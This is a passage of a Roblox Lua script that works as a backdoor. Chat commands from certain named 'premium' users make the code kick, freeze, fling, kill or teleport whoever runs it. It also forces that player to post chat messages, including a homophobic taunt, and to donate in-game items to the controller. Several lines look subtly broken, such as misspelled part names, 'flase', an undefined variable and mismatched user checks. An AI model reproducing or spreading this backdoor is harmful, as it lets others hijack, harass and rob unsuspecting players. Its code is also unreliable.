			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__003)
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__003)
		end
	end
end)

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__003 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__003.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__003 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = ".";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 5;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------
local freeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
end

local unfreeze = function()
	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
end

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".fling .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
			power = 99999999 -- change this to make it more or less powerful
 
			game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".freeze .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			freeze()
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".unfreeze .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			unfreeze()
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".kick .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer:kick("You have been kicked.")
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".oof .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.Humanoid:Destroy()
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".error .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".bring .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__004.Character.UpperTorso.Position)
		end
	end

end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".sit .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = true
				end
			end
		end
	end
end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".troll .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
		end
	end
end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".unsit .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			local character = game.Players.LocalPlayer.Character
			if character then
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid.Sit = false
				end
			end
		end
	end
end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".enlighten .") then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
			game.Players:Chat(";enlighten " .. user_premium__004)
		end
	end
end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".donate ." .. text) then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game.Players:Chat(";donate " .. text .. " " .. user_premium__004)
		end
	end
end)

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".say ." .. text ) then
		if game.Players.LocalPlayer ~= user_premium__004 then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
		end
	end
end)

---------------------------------------------------------------------

user_premium__005.Chatted:connect(function(cht)
	if cht:match(".cmdx") then
		if game.Players.LocalPlayer == user_premium__004 then
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = ".";
	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
	Time = 5;
	Icon = "rbxassetid://999999999";
}) 
		end
	end

end)

---------------------------------------------------------------------
